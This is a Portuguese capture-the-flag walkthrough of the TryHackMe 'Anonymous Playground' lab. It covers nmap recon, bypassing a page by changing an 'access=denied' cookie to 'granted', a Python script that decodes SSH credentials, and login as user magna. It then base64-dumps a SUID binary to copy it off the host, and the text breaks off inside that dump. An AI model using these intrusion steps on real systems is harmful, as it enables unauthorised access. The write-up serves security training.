<p><img src="/img/thm/thm-anonymousplayground-logo.png" /></p>

<p><br /></p>

<table>
  <thead>
    <tr>
      <th>Nome</th>
      <th><a href="https://tryhackme.com/room/anonymousplayground">Anonymous Playground</a></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>OS</td>
      <td>Linux</td>
    </tr>
    <tr>
      <td>Nível</td>
      <td>Hard</td>
    </tr>
  </tbody>
</table>

<p><br /></p>

<h2 id="recon">RECON</h2>

<h3 id="nmap">Nmap</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Desktop/h41stur.github.io/_posts]
└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-sCV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 10.10.196.173 <span class="nt">--min-rate</span><span class="o">=</span>512
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 60:b6:ad:4c:3e:f9:d2:ec:8b:cd:3b:45:a5:ac:5f:83 <span class="o">(</span>RSA<span class="o">)</span>
|   256 6f:9a:be:df:fc:95:a2:31:8f:db:e5:a2:da:8a:0c:3c <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e6:98:52:49:cf:f2:b8:65:d7:41:1c:83:2e:94:24:88 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-favicon: Unknown favicon MD5: 533ABADAA92DA56EA5CB1FE4DAC5B47E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/zYdHuAKjP
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Proving Grounds
No exact OS matches <span class="k">for </span>host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span><span class="nb">.</span>


</code></pre></div></div>

<p>O nmap nos trouxe somente as portas 80 e 22, vamos começar pela porta 80.</p>

<h3 id="porta-80">Porta 80</h3>

<p><img src="/img/thm/thm-anonymousplayground-1.png" /></p>

<p>Encontramos uma página inicial simples com poucas informações com um único link funcional para a página <code class="language-plaintext highlighter-rouge">/operatives.php</code>.
Ao checar o código fonte da home, encontramos link para a página <code class="language-plaintext highlighter-rouge">/upcoming.php</code>, porém, esta página aparentemente não existe.</p>

<p><img src="/img/thm/thm-anonymousplayground-2.png" /></p>

<p>Em <code class="language-plaintext highlighter-rouge">/operatives.php</code>, encontramos uma lista de membros, que podem ser um indício de possíveis usuários.</p>

<p><img src="/img/thm/thm-anonymousplayground-3.png" /></p>

<p>Checando em <code class="language-plaintext highlighter-rouge">/robots.txt</code>, encontramos um diretório desabilitado.</p>

<p><img src="/img/thm/thm-anonymousplayground-4.png" /></p>

<p>Ao acessar o diretório <code class="language-plaintext highlighter-rouge">/zYdHuAKjP</code> nos deparamos a mensagem de acesso não autorizado.</p>

<p><img src="/img/thm/thm-anonymousplayground-5.png" /></p>

<p>Após um tempo de enumeração, decidi checar o cookie da página, no <code class="language-plaintext highlighter-rouge">Firefox</code>, pressionando <code class="language-plaintext highlighter-rouge">F12</code>, e encontrei o cookie: <code class="language-plaintext highlighter-rouge">access=denied</code>.</p>

<p><img src="/img/thm/thm-anonymousplayground-6.png" /></p>

<p>Decidi mudar o <code class="language-plaintext highlighter-rouge">denied</code> para <code class="language-plaintext highlighter-rouge">granted</code> e recarregar a página, desta vez ela retornou uma mensagem criptografada.</p>

<p><img src="/img/thm/thm-anonymousplayground-7.png" /></p>

<h3 id="decriptando-a-mensagem">Decriptando a mensagem</h3>

<p>Aparentemente esta mensagem está separada em duas partes pelo delimitador <code class="language-plaintext highlighter-rouge">::</code>, depois de um bom tempo tentando reconhecer o tipo de criptografia, chequei a dica do criador da máquina que diz <code class="language-plaintext highlighter-rouge">You're going to want to write a Python script for this. 'zA' = 'a'</code>.</p>

<p>A pŕopria dica é um tanto enigmática, porém utilizando um pouco de matemática, encontrei o seguinte raciocínio:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Se zA = A

z = 26 = letra 26 do alfabeto
A = 1 = letra 1 do alfabeto

Se o alfabeto tem 26 letras e o resultado da equação é "a", logo:

(z + A) % 26 = a
(26 + 1) % 26 = 1

Se este raciocínio estiver correto, a chave são pares de letras.
</code></pre></div></div>

<p>Seguindo esta linha de raciocínio, criei o <code class="language-plaintext highlighter-rouge">decrypt.py</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
        <span class="n">arr</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
                <span class="n">arr</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">31</span><span class="p">))</span> <span class="c1"># operacao AND com 31
</span>
        <span class="c1"># resolvendo em pares
</span>        <span class="n">r</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">arr</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
                <span class="n">r</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">arr</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span> <span class="o">%</span> <span class="mi">26</span><span class="p">)</span>

        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">)):</span>
                <span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">r</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="mi">64</span><span class="p">).</span><span class="n">lower</span><span class="p">(),</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>

<span class="n">p1</span> <span class="o">=</span> <span class="s">"hEzAdCfHzA"</span>
<span class="n">decrypt</span><span class="p">(</span><span class="n">p1</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"::"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>
<span class="n">p2</span> <span class="o">=</span> <span class="s">"hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN"</span>
<span class="n">decrypt</span><span class="p">(</span><span class="n">p2</span><span class="p">)</span>
</code></pre></div></div>

<p>Ao rodar o script, temos uma possível combinação de <code class="language-plaintext highlighter-rouge">usuário:senha</code>.</p>

<p><img src="/img/thm/thm-anonymousplayground-8.png" /></p>

<p>Podemos tentar login com SSH na máquina.</p>

<p><img src="/img/thm/thm-anonymousplayground-9.png" /></p>

<p>E conseguimos acesso remoto!!!</p>

<p>A primeira <code class="language-plaintext highlighter-rouge">flag.txt</code> se encontra no diretório do usuário.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>magna@anonymous-playground:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 64
drwxr-xr-x 7 magna  magna  4096 Jul 10  2020 <span class="nb">.</span>
drwxr-xr-x 5 root   root   4096 Jul  4  2020 ..
lrwxrwxrwx 1 root   root      9 Jul  4  2020 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 magna  magna   220 Jul  4  2020 .bash_logout
<span class="nt">-rw-r--r--</span> 1 magna  magna  3771 Jul  4  2020 .bashrc
drwx------ 2 magna  magna  4096 Jul  4  2020 .cache
drwxr-xr-x 3 magna  magna  4096 Jul  7  2020 .config
<span class="nt">-r--------</span> 1 magna  magna    33 Jul  4  2020 flag.txt
drwx------ 3 magna  magna  4096 Jul  4  2020 .gnupg
<span class="nt">-rwsr-xr-x</span> 1 root   root   8528 Jul 10  2020 hacktheworld
drwxrwxr-x 3 magna  magna  4096 Jul  4  2020 .local
<span class="nt">-rw-r--r--</span> 1 spooky spooky  324 Jul  6  2020 note_from_spooky.txt
<span class="nt">-rw-r--r--</span> 1 magna  magna   807 Jul  4  2020 .profile
drwx------ 2 magna  magna  4096 Jul  4  2020 .ssh
<span class="nt">-rw-------</span> 1 magna  magna   817 Jul  7  2020 .viminfo
</code></pre></div></div>
<p>Ainda no diretório do usuário, encontramos o arquivo <code class="language-plaintext highlighter-rouge">note_from_spooky.txt</code> que contém uma mensagem.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hey Magna,

Check out this binary I made!  I've been practicing my skills in C so that I can get better at Reverse
Engineering and Malware Development.  I think this is a really good start.  See if you can break it!

P.S. I've had the admins install radare2 and gdb so you can debug and reverse it right here!

Best,
Spooky
</code></pre></div></div>
<p>Aparentemente o binário <code class="language-plaintext highlighter-rouge">hacktheworld</code> é vulnerável.
Se conseguirmos explorar este binário, teremos um shell, a mensagem também diz que a máquina possui o debbuger <code class="language-plaintext highlighter-rouge">gdb</code> e o <code class="language-plaintext highlighter-rouge">radare2</code> para facilitar a exploração, porém decidi explorar localmente, pois prefiro utilizar o plugin <code class="language-plaintext highlighter-rouge">peda</code>, no gdb.</p>

<p>Para obter o arquivo localmente, vou criptografá-lo em <code class="language-plaintext highlighter-rouge">base64</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>magna@anonymous-playground:~<span class="nv">$ </span><span class="nb">cat </span>hacktheworld | <span class="nb">base64
</span>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
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAUAZAAAAAAAAgBkAAAAAAAAEAAAAAAAAAAQAAAAAAAAAMAAAAAAAAAOAEQAAAAAAA
DQAAAAAAAACEB0AAAAAAABkAAAAAAAAAEA5gAAAAAAAbAAAAAAAAAAgAAAAAAAAAGgAAAAAAAAAY
DmAAAAAAABwAAAAAAAAACAAAAAAAAAD1/v9vAAAAAJgCQAAAAAAABQAAAAAAAACQA0AAAAAAAAYA
AAAAAAAAuAJAAAAAAAAKAAAAAAAAAF0AAAAAAAAACwAAAAAAAAAYAAAAAAAAABUAAAAAAAAAAAAA
AAAAAAADAAAAAAAAAAAQYAAAAAAAAgAAAAAAAACQAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAA
AAAAAFAEQAAAAAAABwAAAAAAAAAgBEAAAAAAAAgAAAAAAAAAMAAAAAAAAAAJAAAAAAAAABgAAAAA
AAAA/v//bwAAAAAABEAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAAO4DQAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAOYAAAAAAA
AAAAAAAAAAAAAAAAAAAAABYFQAAAAAAAJgVAAAAAAAA2BUAAAAAAAEYFQAAAAAAAVgVAAAAAAABm
BUAAAAAAAAAAAAAAAAAAAAAAAAAAAABHQ0M6IChVYnVudHUgNy41LjAtM3VidW50dTF+MTguMDQp
IDcuNS4wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABADgCQAAAAAAAAAAA
AAAAAAAAAAAAAwACAFQCQAAAAAAAAAAAAAAAAAAAAAAAAwADAHQCQAAAAAAAAAAAAAAAAAAAAAAA
AwAEAJgCQAAAAAAAAAAAAAAAAAAAAAAAAwAFALgCQAAAAAAAAAAAAAAAAAAAAAAAAwAGAJADQAAA
AAAAAAAAAAAAAAAAAAAAAwAHAO4DQAAAAAAAAAAAAAAAAAAAAAAAAwAIAAAEQAAAAAAAAAAAAAAA
AAAAAAAAAwAJACAEQAAAAAAAAAAAAAAAAAAAAAAAAwAKAFAEQAAAAAAAAAAAAAAAAAAAAAAAAwAL
AOAEQAAAAAAAAAAAAAAAAAAAAAAAAwAMAAAFQAAAAAAAAAAAAAAAAAAAAAAAAwANAHAFQAAAAAAA
AAAAAAAAAAAAAAAAAwAOAIQHQAAAAAAAAAAAAAAAAAAAAAAAAwAPAJAHQAAAAAAAAAAAAAAAAAAA
AAAAAwAQACgIQAAAAAAAAAAAAAAAAAAAAAAAAwARAHAIQAAAAAAAAAAAAAAAAAAAAAAAAwASABAO
YAAAAAAAAAAAAAAAAAAAAAAAAwATABgOYAAAAAAAAAAAAAAAAAAAAAAAAwAUACAOYAAAAAAAAAAA
AAAAAAAAAAAAAwAVAPAPYAAAAAAAAAAAAAAAAAAAAAAAAwAWAAAQYAAAAAAAAAAAAAAAAAAAAAAA
AwAXAEgQYAAAAAAAAAAAAAAAAAAAAAAAAwAYAFgQYAAAAAAAAAAAAAAAAAAAAAAAAwAZAAAAAAAA
AAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAgANALAFQAAAAAAAAAAAAAAA
AAAOAAAAAgANAOAFQAAAAAAAAAAAAAAAAAAhAAAAAgANACAGQAAAAAAAAAAAAAAAAAA3AAAAAQAY
AFgQYAAAAAAAAQAAAAAAAABGAAAAAQATABgOYAAAAAAAAAAAAAAAAABtAAAAAgANAFAGQAAAAAAA
AAAAAAAAAAB5AAAAAQASABAOYAAAAAAAAAAAAAAAAACYAAAABADx/wAAAAAAAAAAAAAAAAAAAAAB
AAAABADx/wAAAAAAAAAAAAAAAAAAAACnAAAAAQARAIwJQAAAAAAAAAAAAAAAAAAAAAAABADx/wAA
AAAAAAAAAAAAAAAAAAC1AAAAAAASABgOYAAAAAAAAAAAAAAAAADGAAAAAQAUACAOYAAAAAAAAAAA
AAAAAADPAAAAAAASABAOYAAAAAAAAAAAAAAAAADiAAAAAAAQACgIQAAAAAAAAAAAAAAAAAD1AAAA
AQAWAAAQYAAAAAAAAAAAAAAAAAALAQAAEgANAIAHQAAAAAAAAgAAAAAAAACHAQAAIAAXAEgQYAAA
AAAAAAAAAAAAAAAbAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAAtAQAAEAAXAFgQYAAAAAAAAAAAAAAA
AAAVAQAAEgAOAIQHQAAAAAAAAAAAAAAAAAA0AQAAEgAAAAAAAAAAAAAAAAAAAAAAAABIAQAAEgAA
AAAAAAAAAAAAAAAAAAAAAABcAQAAEgANAFcGQAAAAAAAgQAAAAAAAABmAQAAEgAAAAAAAAAAAAAA
AAAAAAAAAACFAQAAEAAXAEgQYAAAAAAAAAAAAAAAAACSAQAAIAAAAAAAAAAAAAAAAAAAAAAAAACh
AQAAEQIXAFAQYAAAAAAAAAAAAAAAAACuAQAAEQAPAJAHQAAAAAAABAAAAAAAAAC9AQAAEgAAAAAA
AAAAAAAAAAAAAAAAAADPAQAAEgANABAHQAAAAAAAZQAAAAAAAADBAAAAEAAYAGAQYAAAAAAAAAAA
AAAAAADfAQAAEgINAKAFQAAAAAAAAgAAAAAAAACLAQAAEgANAHAFQAAAAAAAKwAAAAAAAAD3AQAA
EAAYAFgQYAAAAAAAAAAAAAAAAAADAgAAEgANANgGQAAAAAAAOAAAAAAAAAAIAgAAEQIXAFgQYAAA
AAAAAAAAAAAAAAAUAgAAEgAAAAAAAAAAAAAAAAAAAAAAAAAoAgAAEgAAAAAAAAAAAAAAAAAAAAAA
AADZAQAAEgALAOAEQAAAAAAAAAAAAAAAAAAAY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25l
cwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjc2OTgAX19kb19nbG9iYWxfZHRvcnNf
YXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5
X2VudHJ5AGhhY2t0aGV3b3JsZC5jAF9fRlJBTUVfRU5EX18AX19pbml0X2FycmF5X2VuZABfRFlO
QU1JQwBfX2luaXRfYXJyYXlfc3RhcnQAX19HTlVfRUhfRlJBTUVfSERSAF9HTE9CQUxfT0ZGU0VU
X1RBQkxFXwBfX2xpYmNfY3N1X2ZpbmkAcHV0c0BAR0xJQkNfMi4yLjUAX2VkYXRhAHN5c3RlbUBA
R0xJQkNfMi4yLjUAcHJpbnRmQEBHTElCQ18yLjIuNQBjYWxsX2Jhc2gAX19saWJjX3N0YXJ0X21h
aW5AQEdMSUJDXzIuMi41AF9fZGF0YV9zdGFydABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUA
X0lPX3N0ZGluX3VzZWQAZ2V0c0BAR0xJQkNfMi4yLjUAX19saWJjX2NzdV9pbml0AF9kbF9yZWxv
Y2F0ZV9zdGF0aWNfcGllAF9fYnNzX3N0YXJ0AG1haW4AX19UTUNfRU5EX18Ac2V0dWlkQEBHTElC
Q18yLjIuNQBzbGVlcEBAR0xJQkNfMi4yLjUAAC5zeW10YWIALnN0cnRhYgAuc2hzdHJ0YWIALmlu
dGVycAAubm90ZS5BQkktdGFnAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAu
ZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5p
bml0AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRfYXJy
YXkALmZpbmlfYXJyYXkALmR5bmFtaWMALmdvdAAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAABsAAAABAAAAAgAAAAAAAAA4AkAAAAAAADgCAAAAAAAAHAAAAAAAAAAAAAAAAAAA
AAEAAAAAAAAAAAAAAAAAAAAjAAAABwAAAAIAAAAAAAAAVAJAAAAAAABUAgAAAAAAACAAAAAAAAAA
AAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAMQAAAAcAAAACAAAAAAAAAHQCQAAAAAAAdAIAAAAAAAAk
AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAD2//9vAgAAAAAAAACYAkAAAAAAAJgC
AAAAAAAAHAAAAAAAAAAFAAAAAAAAAAgAAAAAAAAAAAAAAAAAAABOAAAACwAAAAIAAAAAAAAAuAJA
AAAAAAC4AgAAAAAAANgAAAAAAAAABgAAAAEAAAAIAAAAAAAAABgAAAAAAAAAVgAAAAMAAAACAAAA
AAAAAJADQAAAAAAAkAMAAAAAAABdAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAF4AAAD/
//9vAgAAAAAAAADuA0AAAAAAAO4DAAAAAAAAEgAAAAAAAAAFAAAAAAAAAAIAAAAAAAAAAgAAAAAA
AABrAAAA/v//bwIAAAAAAAAAAARAAAAAAAAABAAAAAAAACAAAAAAAAAABgAAAAEAAAAIAAAAAAAA
AAAAAAAAAAAAegAAAAQAAAACAAAAAAAAACAEQAAAAAAAIAQAAAAAAAAwAAAAAAAAAAUAAAAAAAAA
CAAAAAAAAAAYAAAAAAAAAIQAAAAEAAAAQgAAAAAAAABQBEAAAAAAAFAEAAAAAAAAkAAAAAAAAAAF
AAAAFgAAAAgAAAAAAAAAGAAAAAAAAACOAAAAAQAAAAYAAAAAAAAA4ARAAAAAAADgBAAAAAAAABcA
AAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAiQAAAAEAAAAGAAAAAAAAAAAFQAAAAAAAAAUA
AAAAAABwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAJQAAAABAAAABgAAAAAAAABwBUAA
AAAAAHAFAAAAAAAAEgIAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAACaAAAAAQAAAAYAAAAA
